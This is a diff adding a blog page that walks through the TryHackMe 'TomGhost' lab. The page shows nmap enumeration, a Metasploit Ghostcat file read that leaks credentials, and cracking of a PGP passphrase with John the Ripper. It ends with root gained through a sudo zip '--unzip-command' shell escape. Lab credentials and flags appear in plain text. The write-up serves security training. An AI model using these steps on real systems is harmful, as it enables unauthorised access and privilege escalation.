@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="nair0lf32 ">
+<meta name="description" content="TomGhost Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQvC8xe2qKLoPG3vaJagEW2eW4juBu9nJvn53nRjyw7y/0GEWIxE1KqcPXZiL&#43;RKfkKA7RJNTXN2W9kCG8i6JdVWs2x9wD28UtwYxcyo6M9dQ7i2mXlJpTHtSncOoufSA45eqWT4GY&#43;iEaBekWhnxWM&#43;TrFOMNS5bpmUXrjuBR2JtN9a9cqHQ2zGdSlN&#43;jLYi2Z5C7IVqxYb9yw5RBV5&#43;bX7J4dvHNIs3otGDeGJ8oXVhd&#43;aELUN8/C2p5bVqpGk04KI2gGEyU611v3eOzoP6obem9vsk7Kkgsw7eRNt1&#43;CBrwWldPr8hy6nhA6Oi5qmJgK1x&#43;fCmsfLSH3sz1z4Ln| 256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOscw5angd6i9vsr7MfCAugRPvtx/aLjNzjAvoFEkwKeO53N01Dn17eJxrbIWEj33sp8nzx1Lillg/XM&#43;Lk69CQ=| 256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqgzoXzgz5QIhEWm3&#43;Mysrwk89YW2cd2Nmad&#43;PrE4jw53/tcp open tcpwrapped syn-ack726/tcp filtered unknown no-response5033/tcp filtered jtnetd-server no-response8009/tcp open ajp13 syn-ack Apache Jserv (Protocol v1.3)| ajp-methods:|_ Supported methods: GET HEAD POST OPTIONS8080/tcp open http syn-ack Apache Tomcat 9." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/tomghost/tomghost/" />
+
+
+    <title>
+        
+             :: Zer0ne  — welcome friend
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://nair0lf32.github.io/zer0ne/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://nair0lf32.github.io/zer0ne/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://nair0lf32.github.io/zer0ne/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://nair0lf32.github.io/zer0ne/favicon-16x16.png">
+    <link rel="manifest" href="https://nair0lf32.github.io/zer0ne/site.webmanifest">
+    <link rel="mask-icon" href="https://nair0lf32.github.io/zer0ne/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://nair0lf32.github.io/zer0ne/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="">
+<meta itemprop="description" content="TomGhost Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQvC8xe2qKLoPG3vaJagEW2eW4juBu9nJvn53nRjyw7y/0GEWIxE1KqcPXZiL&#43;RKfkKA7RJNTXN2W9kCG8i6JdVWs2x9wD28UtwYxcyo6M9dQ7i2mXlJpTHtSncOoufSA45eqWT4GY&#43;iEaBekWhnxWM&#43;TrFOMNS5bpmUXrjuBR2JtN9a9cqHQ2zGdSlN&#43;jLYi2Z5C7IVqxYb9yw5RBV5&#43;bX7J4dvHNIs3otGDeGJ8oXVhd&#43;aELUN8/C2p5bVqpGk04KI2gGEyU611v3eOzoP6obem9vsk7Kkgsw7eRNt1&#43;CBrwWldPr8hy6nhA6Oi5qmJgK1x&#43;fCmsfLSH3sz1z4Ln| 256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOscw5angd6i9vsr7MfCAugRPvtx/aLjNzjAvoFEkwKeO53N01Dn17eJxrbIWEj33sp8nzx1Lillg/XM&#43;Lk69CQ=| 256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqgzoXzgz5QIhEWm3&#43;Mysrwk89YW2cd2Nmad&#43;PrE4jw53/tcp open tcpwrapped syn-ack726/tcp filtered unknown no-response5033/tcp filtered jtnetd-server no-response8009/tcp open ajp13 syn-ack Apache Jserv (Protocol v1.3)| ajp-methods:|_ Supported methods: GET HEAD POST OPTIONS8080/tcp open http syn-ack Apache Tomcat 9.">
+
+<meta itemprop="wordCount" content="1047"><meta itemprop="image" content="https://nair0lf32.github.io/zer0ne"/>
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://nair0lf32.github.io/zer0ne"/>
+
+<meta name="twitter:title" content=""/>
+<meta name="twitter:description" content="TomGhost Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQvC8xe2qKLoPG3vaJagEW2eW4juBu9nJvn53nRjyw7y/0GEWIxE1KqcPXZiL&#43;RKfkKA7RJNTXN2W9kCG8i6JdVWs2x9wD28UtwYxcyo6M9dQ7i2mXlJpTHtSncOoufSA45eqWT4GY&#43;iEaBekWhnxWM&#43;TrFOMNS5bpmUXrjuBR2JtN9a9cqHQ2zGdSlN&#43;jLYi2Z5C7IVqxYb9yw5RBV5&#43;bX7J4dvHNIs3otGDeGJ8oXVhd&#43;aELUN8/C2p5bVqpGk04KI2gGEyU611v3eOzoP6obem9vsk7Kkgsw7eRNt1&#43;CBrwWldPr8hy6nhA6Oi5qmJgK1x&#43;fCmsfLSH3sz1z4Ln| 256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOscw5angd6i9vsr7MfCAugRPvtx/aLjNzjAvoFEkwKeO53N01Dn17eJxrbIWEj33sp8nzx1Lillg/XM&#43;Lk69CQ=| 256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqgzoXzgz5QIhEWm3&#43;Mysrwk89YW2cd2Nmad&#43;PrE4jw53/tcp open tcpwrapped syn-ack726/tcp filtered unknown no-response5033/tcp filtered jtnetd-server no-response8009/tcp open ajp13 syn-ack Apache Jserv (Protocol v1.3)| ajp-methods:|_ Supported methods: GET HEAD POST OPTIONS8080/tcp open http syn-ack Apache Tomcat 9."/>
+
+
+
+    <meta property="og:title" content="" />
+<meta property="og:description" content="TomGhost Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQvC8xe2qKLoPG3vaJagEW2eW4juBu9nJvn53nRjyw7y/0GEWIxE1KqcPXZiL&#43;RKfkKA7RJNTXN2W9kCG8i6JdVWs2x9wD28UtwYxcyo6M9dQ7i2mXlJpTHtSncOoufSA45eqWT4GY&#43;iEaBekWhnxWM&#43;TrFOMNS5bpmUXrjuBR2JtN9a9cqHQ2zGdSlN&#43;jLYi2Z5C7IVqxYb9yw5RBV5&#43;bX7J4dvHNIs3otGDeGJ8oXVhd&#43;aELUN8/C2p5bVqpGk04KI2gGEyU611v3eOzoP6obem9vsk7Kkgsw7eRNt1&#43;CBrwWldPr8hy6nhA6Oi5qmJgK1x&#43;fCmsfLSH3sz1z4Ln| 256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOscw5angd6i9vsr7MfCAugRPvtx/aLjNzjAvoFEkwKeO53N01Dn17eJxrbIWEj33sp8nzx1Lillg/XM&#43;Lk69CQ=| 256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqgzoXzgz5QIhEWm3&#43;Mysrwk89YW2cd2Nmad&#43;PrE4jw53/tcp open tcpwrapped syn-ack726/tcp filtered unknown no-response5033/tcp filtered jtnetd-server no-response8009/tcp open ajp13 syn-ack Apache Jserv (Protocol v1.3)| ajp-methods:|_ Supported methods: GET HEAD POST OPTIONS8080/tcp open http syn-ack Apache Tomcat 9." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/tomghost/tomghost/" /><meta property="og:image" content="https://nair0lf32.github.io/zer0ne"/><meta property="article:section" content="writeups" />
+
+<meta property="og:site_name" content="Zer0ne" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://nair0lf32.github.io/zer0ne/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text">Zer0ne #</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#0FF00D;
+                   animation-duration:2s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://nair0lf32.github.io/zer0ne/about">About</a></li><li><a href="https://nair0lf32.github.io/zer0ne/posts">Blog</a></li><li><a href="https://nair0lf32.github.io/zer0ne/writeups">Writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/tomghost/tomghost/"></a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="tomghost">TomGhost</h1>
+<!-- raw HTML omitted -->
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="nmap">nmap</h3>
+<pre tabindex="0"><code>PORT     STATE    SERVICE       REASON      VERSION
+22/tcp   open     ssh           syn-ack     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQvC8xe2qKLoPG3vaJagEW2eW4juBu9nJvn53nRjyw7y/0GEWIxE1KqcPXZiL+RKfkKA7RJNTXN2W9kCG8i6JdVWs2x9wD28UtwYxcyo6M9dQ7i2mXlJpTHtSncOoufSA45eqWT4GY+iEaBekWhnxWM+TrFOMNS5bpmUXrjuBR2JtN9a9cqHQ2zGdSlN+jLYi2Z5C7IVqxYb9yw5RBV5+bX7J4dvHNIs3otGDeGJ8oXVhd+aELUN8/C2p5bVqpGk04KI2gGEyU611v3eOzoP6obem9vsk7Kkgsw7eRNt1+CBrwWldPr8hy6nhA6Oi5qmJgK1x+fCmsfLSH3sz1z4Ln
+|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOscw5angd6i9vsr7MfCAugRPvtx/aLjNzjAvoFEkwKeO53N01Dn17eJxrbIWEj33sp8nzx1Lillg/XM+Lk69CQ=
+|   256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqgzoXzgz5QIhEWm3+Mysrwk89YW2cd2Nmad+PrE4jw
+53/tcp   open     tcpwrapped    syn-ack
+726/tcp  filtered unknown       no-response
+5033/tcp filtered jtnetd-server no-response
+8009/tcp open     ajp13         syn-ack     Apache Jserv (Protocol v1.3)
+| ajp-methods:
+|_  Supported methods: GET HEAD POST OPTIONS
+8080/tcp open     http          syn-ack     Apache Tomcat 9.0.30
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Apache Tomcat/9.0.30
+|_http-favicon: Apache Tomcat
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>Apache tomcat server on port 8080 but no website is setup?</p>
+<p>we search an exploit and with metasploit we use this</p>
+<pre tabindex="0"><code>msf6 auxiliary(admin/http/tomcat_ghostcat) &gt; run
+[*] Running module against 10.10.212.86
+Status Code: 200
+Accept-Ranges: bytes
+ETag: W/&#34;1261-1583902632000&#34;
+Last-Modified: Wed, 11 Mar 2020 04:57:12 GMT
+Content-Type: application/xml
+Content-Length: 1261
+
+&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;!--
+Licensed to the Apache Software Foundation (ASF) under one or more
+contributor license agreements.  See the NOTICE file distributed with
+this work for additional information regarding copyright ownership.
+The ASF licenses this file to You under the Apache License, Version 2.0
+(the &#34;License&#34;); you may not use this file except in compliance with
+the License.  You may obtain a copy of the License at
+
+http://www.apache.org/licenses/LICENSE-2.0
+
+Unless required by applicable law or agreed to in writing, software
+distributed under the License is distributed on an &#34;AS IS&#34; BASIS,
+WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+See the License for the specific language governing permissions and
+limitations under the License.
+--&gt;
+
+&lt;web-app xmlns=&#34;http://xmlns.jcp.org/xml/ns/javaee&#34;
+xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34;
+xsi:schemaLocation=&#34;http://xmlns.jcp.org/xml/ns/javaee
+http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&#34;
+version=&#34;4.0&#34;
+metadata-complete=&#34;true&#34;&gt;
+
+&lt;display-name&gt;Welcome to Tomcat&lt;/display-name&gt;
+&lt;description&gt;
+Welcome to GhostCat
+skyfuck:8730281lkjlkjdqlksalks
+&lt;/description&gt;
+
+&lt;/web-app&gt;
+
+[+] 10.10.212.86:8080 - /home/its_a_me/.msf4/loot/20211029191143_default_10.10.212.86_WEBINFweb.xml_261102.txt
+[*] Auxiliary module execution completed
+</code></pre><p>Found credentials:</p>
+<p><code>skyfuck : 8730281lkjlkjdqlksalks</code></p>
+<p>ssh port open maybe we can ssh with those</p>
+<p>bingo!</p>
+<pre tabindex="0"><code>skyfuck@ubuntu:~$ whoami
+skyfuck
+</code></pre><p>we go straight home and find two folders</p>
+<p>user merlin got our user flag</p>
+<pre tabindex="0"><code>THM{tomcat_is_dead}
+</code></pre><h2 id="priviledge-escalation">Priviledge Escalation</h2>
+<p>The second folder have two files pgp and asc files</p>
+<p>Might be key for decryption and privileges escalation?</p>
+<p>I want those files&hellip;so I get them</p>
+<p>I scp the whole skyfck folder from another terminal with</p>
+<p><code>scp -r skyfuck@10.10.152.29:/home/skyfuck .</code></p>
+<p>Time to crack that pgp</p>
+<p>Tried to import the key but it asked for secret wordpass&hellip;wich I do not have</p>
+<p>So we do some magic</p>
+<p><code>gpg2john tryhackme.asc &gt; tryhackme.john</code></p>
+<p>its always rockyou.txt</p>
+<pre tabindex="0"><code>john --wordlist=/usr/share/wordlists/rockyou.txt tryhackme.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+Cost 1 (s2k-count) is 65536 for all loaded hashes
+Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
+Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
+Will run 2 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+alexandru (tryhackme)
+1g 0:00:00:01 DONE (2021-10-29 20:05) 0.6896g/s 739.3p/s 739.3c/s 739.3C/s chinita..alexandru
+Use the &#34;--show&#34; option to display all of the cracked passwords reliably
+Session completed
+</code></pre><p>alexandru? what a passphrase</p>
+<p>Anyway where were we?</p>
+<pre tabindex="0"><code>gpg --import tryhackme.asc
+
+gpg: clef 8F3DA3DEC6707170 : « tryhackme &lt;stuxnet@tryhackme.com&gt; » n&#39;est pas modifiée
+gpg: clef 8F3DA3DEC6707170 : clef secrète importée
+gpg: clef 8F3DA3DEC6707170 : « tryhackme &lt;stuxnet@tryhackme.com&gt; » n&#39;est pas modifiée
+gpg: Quantité totale traitée : 2
+gpg: non modifiées : 2
+gpg: clefs secrètes lues : 1
+gpg: clefs secrètes importées : 1
+</code></pre><p>we check if its imported</p>
+<pre tabindex="0"><code>gpg --list-secret-keys
+/home/my_username/.gnupg/pubring.kbx
+
+---
+
+sec rsa1024 2020-06-30 [SC]
+BBE208F0233D64B655742C07FFA4B5252BAEB2E6
+uid [ inconnue] TryHackMe (Example Key)
+ssb rsa1024 2020-06-30 [E]
+
+sec dsa3072 2020-03-11 [SCA]
+14B3794D5554349A715CDBA08F3DA3DEC6707170
+uid [ inconnue] tryhackme &lt;stuxnet@tryhackme.com&gt;
+ssb elg1024 2020-03-11 [E]
+</code></pre><p>indeed..now we decrypt and output to a txt file</p>
+<p>it tell us the ELG encrption method is unknown but anyway we cracked it</p>
+<pre tabindex="0"><code>$gpg --output ./decrypted_credentials.txt --decrypt ./credential.pgp
+gpg: Attention : l&#39;algorithme de chiffrement CAST5 est introuvable
+dans les préférences du destinataire
+gpg: chiffré avec une clef ELG de 1024 bits, identifiant 61E104A66184FBCC, créée le 2020-03-11
+« tryhackme &lt;stuxnet@tryhackme.com&gt; »
+</code></pre><p>we get merlin credentials</p>
+<p><code>merlin : asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j</code></p>
+<p>Dafuk is that password? that boy merlin got issues</p>
+<p>lateral movement to merlin and sudo rights</p>
+<pre tabindex="0"><code>skyfuck@ubuntu:~$ su merlin
+Password:
+merlin@ubuntu:/home/skyfuck$
+
+merlin@ubuntu:~$ sudo -l
+Matching Defaults entries for merlin on ubuntu:
+env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User merlin may run the following commands on ubuntu:
+(root : root) NOPASSWD: /usr/bin/zip
+</code></pre><p>Lets ask gtfobins how to abuse this for shell spawn`</p>
+<pre tabindex="0"><code>TF=$(mktemp -u)
+sudo zip $TF /etc/hosts -T -TT &#39;sh #&#39;
+sudo rm $TF
+</code></pre><pre tabindex="0"><code>merlin@ubuntu:~$ zip
+Copyright (c) 1990-2008 Info-ZIP - Type &#39;zip &#34;-L&#34;&#39; for software license.
+Zip 3.0 (July 5th 2008). Usage:
+zip [-options] [-b path] [-t mmddyyyy] [-n suffixes] [zipfile list] [-xi list]
+The default action is to add or replace zipfile entries from list, which
+can include the special name - to compress standard input.
+If zipfile and list are omitted, zip compresses stdin to stdout.
+-f freshen: only changed files -u update: only changed or new files
+-d delete entries in zipfile -m move into zipfile (delete OS files)
+-r recurse into directories -j junk (don&#39;t record) directory names
+-0 store only -l convert LF to CR LF (-ll CR LF to LF)
+-1 compress faster -9 compress better
+-q quiet operation -v verbose operation/print version info
+-c add one-line comments -z add zipfile comment
+-@ read names from stdin -o make zipfile as old as latest entry
+-x exclude the following names -i include only the following names
+-F fix zipfile (-FF try harder) -D do not add directory entries
+-A adjust self-extracting exe -J junk zipfile prefix (unzipsfx)
+-T test zipfile integrity -X eXclude eXtra file attributes
+-y store symbolic links as the link instead of the referenced file
+-e encrypt -n don&#39;t compress these suffixes
+-h2 show more help
+</code></pre><p>Technically we can abuse the <code>-T</code> flag that test a zip file integrity by running <code>--unzip-commands</code></p>
+<p>we create somefile and use <code>1</code> to zip faster</p>
+<pre tabindex="0"><code>merlin@ubuntu:~$ touch somefile.txt
+merlin@ubuntu:~$ ls
+somefile.txt user.txt
+merlin@ubuntu:~$ sudo zip 1.zip somefile.txt -T --unzip-command=&#34;sh -c /bin/bash&#34;
+adding: somefile.txt (stored 0%)
+root@ubuntu:~# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre><p>Now we get our flag</p>
+<pre tabindex="0"><code>root@ubuntu:/root# cat root.txt
+THM{tomcat_ghost}
+</code></pre><p>we find another <code>ufw</code> folder with a sh script</p>
+<pre tabindex="0"><code>root@ubuntu:/root# cd ufw
+root@ubuntu:/root/ufw# ls
+ufw.sh
+root@ubuntu:/root/ufw# ./ufw.sh
+Firewall stopped and disabled on system startup
+</code></pre><p>lol ok we control the firewall</p>
+<p>nice room</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2022</span>
+            <span><a href="https://nair0lf32.github.io/zer0ne">nair0lf32</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span><a href="https://nair0lf32.github.io/zer0ne/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://nair0lf32.github.io/zer0ne/bundle.min.cf7fb2a9e24608a783e05e4472da2fdf008293289de1ad88d1cba5c143e7e414496dd33b6a228e92f8461ce0c8cbad3c9f9847e73e46dfbce0463393ddd1733a.js" integrity="sha512-z3&#43;yqeJGCKeD4F5Ectov3wCCkyid4a2I0culwUPn5BRJbdM7aiKOkvhGHODIy608n5hH5z5G37zgRjOT3dFzOg=="></script>
+
+
+
+    </body>
+</html>
